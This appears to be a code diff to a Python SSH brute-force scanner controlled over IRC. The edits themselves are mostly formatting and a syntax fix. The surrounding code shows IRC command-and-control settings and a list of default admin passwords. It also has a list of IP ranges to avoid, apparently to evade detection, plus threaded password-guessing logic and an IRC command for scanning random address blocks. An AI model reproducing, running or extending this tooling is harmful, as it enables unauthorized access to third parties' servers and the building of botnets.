@@ -62,7 +62,7 @@ import time
 import urllib.request
 from collections import OrderedDict
 
-# Connection
+# IRC Config
 server     = 'irc.server.com'
 port       = 6667
 use_ipv6   = False
@@ -72,7 +72,7 @@ channel    = '#dev'
 key        = None
 admin_host = 'admin@admin.host'
 
-# Throttle
+# Throttle Settings
 max_threads     = 100
 throttle        = 20
 timeout_breaker = 5
@@ -85,7 +85,7 @@ combos = OrderedDict([
     ('admin', ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'))
 ])
 
-# Important Ranges
+# Important Ranges (DO NOT EDIT)
 spooky   = ('11','21','22','24','25','26','29','49','50','55','62','64','128','129','130','131','132','134','136','137','138','139','140','143','144','146','147','148','150','152','153','155','156','157','158','159','161','162','163','164','167','168','169','194','195','199','203','204','205','207','208','209','212','213','216','217','6','7')
 reserved = ('0','10','100.64','100.65','100.66','100.67','100.68','100.69','100.70','100.71','100.72','100.73','100.74','100.75','100.76','100.77','100.78','100.79','100.80','100.81','100.82','100.83','100.84','100.85','100.86','100.87','100.88','100.89','100.90','100.91','100.92','100.93','100.94','100.95','100.96','100.97','100.98','100.99','100.100','100.101','100.102','100.103','100.104','100.105','100.106','100.107','100.108','100.109','100.110','100.111','100.112','100.113','100.114','100.115','100.116','100.117','100.118','100.119','100.120','100.121','100.122','100.123','100.124','100.125','100.126','100.127','127','169.254','172.16','172.17','172.18','172.19','172.20','172.21','172.22','172.23','172.24','172.25','172.26','172.27','172.28','172.29','172.30','172.31','172.32','192.0.0','192.0.2','192.88.99','192.168','198.18','198.19','198.51.100','203.0.113','224','225','226','227','228','229','230','231','232','233','234','235','236','237','238','239','240','241','242','243','244','245','246','247','248','249','250','251','252','253','254','255')
 
@@ -186,7 +186,7 @@ def get_hostname():
 
 def get_ip():
     try:
-        source = urllib.request.urlopen('http://checkip.dyndns.com/')
+        source  = urllib.request.urlopen('http://checkip.dyndns.com/')
         charset = source.headers.get_content_charset()
         if charset:
             source = source.read().decode(charset)
@@ -279,13 +279,17 @@ class ssh_bruteforce(threading.Thread):
                                 break
                             else:
                                 result = ssh_connect(self.ip, username, item)
-                                if   result == 1 : self.timeouts += 1
-                                elif result == 2 : self.timeouts = timeout_breaker
+                                if result == 1:
+                                    self.timeouts += 1
+                                elif result == 2:
+                                    self.timeouts = timeout_breaker
                                 time.sleep(throttle)
                     else:
                         result = ssh_connect(self.host, username, password)
-                        if   result == 1 : self.timeouts += 1
-                        elif result == 2 : self.timeouts = timeout_breaker
+                        if result == 1:
+                            self.timeouts += 1
+                        elif result == 2:
+                            self.timeouts = timeout_breaker
                         time.sleep(throttle)
 
 def ssh_connect(hostname, username, password):
@@ -351,7 +355,7 @@ class IRC(object):
         else:
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         if self.use_ssl:
-            self.sock = ssl.wrap_socket(self.sock))
+            self.sock = ssl.wrap_socket(self.sock)
 
     def error(self, chan, msg, reason=None):
         if reason:
@@ -413,13 +417,17 @@ class IRC(object):
                     if not self.scanning:
                         if args[2] in ('b','c'):
                             if args[2] == 'b':
-                                if args[3] == 'random' : range_prefix = '{0}.{1}'.format(random_int(0,255), random_int(0,255))
-                                else                   : range_prefix = args[3]
+                                if args[3] == 'random':
+                                    range_prefix = '{0}.{1}'.format(random_int(0,255), random_int(0,255))
+                                else:
+                                    range_prefix = args[3]
                                 start = range_prefix + '.0.0'
                                 end   = range_prefix + '.255.255'
                             elif args[2] == 'c':
-                                if args[3] == 'random' : range_prefix = '{0}.{1}.{2}'.format(random_int(0,255), random_int(0,255), random_int(0,255))
-                                else                   : range_prefix = args[3]
+                                if args[3] == 'random':
+                                    range_prefix = '{0}.{1}.{2}'.format(random_int(0,255), random_int(0,255), random_int(0,255))
+                                else:
+                                    range_prefix = args[3]
                                 start = range_prefix + '.0'
                                 end   = range_prefix + '.255'
                             if check_ip(start) and check_ip(end):
